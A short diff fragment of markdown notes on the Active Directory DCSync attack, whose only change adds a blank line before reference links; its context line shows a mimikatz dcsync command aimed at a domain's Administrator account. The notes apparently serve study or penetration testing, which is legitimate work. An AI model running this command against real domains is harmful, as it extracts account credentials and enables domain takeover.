@@ -42,4 +42,5 @@ mimikatz “lsadump::dcsync /domain:uc.edu /user:Administrator”
 
 ### References
 DcSync theory: https://www.qomplx.com/kerberos_dcsync_attacks_explained/
+
 DcSync exploit: https://adsecurity.org/?p=1729
